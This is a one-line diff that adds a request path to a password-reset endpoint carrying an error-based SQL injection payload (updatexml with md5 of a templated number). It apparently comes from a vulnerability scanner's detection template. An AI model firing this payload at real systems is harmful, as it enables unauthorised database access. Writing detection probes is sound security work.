@@ -1,0 +1,1 @@
+/a/sys/user/resetPassword?mobile=13588888888%27and%20(updatexml(1,concat(0x7e,(select%20md5({{num}})),0x7e),1))%23
